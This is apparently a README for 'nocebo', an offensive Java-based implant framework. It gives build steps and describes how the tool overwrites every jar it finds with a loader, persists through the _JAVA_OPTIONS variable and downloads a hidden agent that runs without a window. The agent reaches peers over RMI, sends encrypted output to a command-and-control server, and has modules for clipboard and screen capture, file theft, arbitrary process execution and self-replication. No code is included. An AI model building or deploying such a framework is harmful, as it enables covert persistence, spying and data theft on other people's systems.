# nocebo
Nocebo exploits javaagent features to persist a P2P agent in all jvms executed on system

 - config variables (passwords, ips, etc) have to be changed manually for now
 - To build, run build.ps1
 - jars will populate in .\server\fileroot\lib
 - run the iAgent.jar to execute the core tool as is or execute the iLoader.jar

It is strongly recommended that you execute this in a vm or on a system that can safely have java files moved around. 

# Execution flow
 - A nocebo instance's autolib.replcate function discovers an attached root filesystem and performs a backup => overwrite operation on all the jars it can find, where the replacement jar is the iLoader javaagent component
 - A program executes the iLoader from the filesystem (potentially even a net share), triggering the main method and instantiating persistence in the _JAVA_OPTIONS env var
 - Another java program executes and picks up _JAVA_OPTIONS, executing the iLoader's premain function
 - The premain downloads the primary agent and hides it on disk before executing it with javaw.exe (which will not generate a new window or stdout)
 - The primary agent seeks RMI instances on its P2P port on the local subnet. P2P instances take priority over direct C2.
 - The agent looks for tasks assigned to its ephemeral UUID. The task contains the necessary class object encoded in Base64 to be loaded if necessary.
 - The agent threads the task and occasionally checks for output, which it then encrypts and forwards to a P2P upstream node or the backend HTTPS server.

# Builtin modules
 - autolib-metadata (pull metadata object from agent)
 - autolib-replicate (replicate agent across root filesystems)
 - genlib-upload (upload file to agent host)
 - genlib-download (download file from agent host)
 - genlib-clipper (monitor clipboard for duration in seconds)
 - genlib-snapper (take x snapshots of screen during duration in seconds)
 - genlib-process (execute arbitrary process)
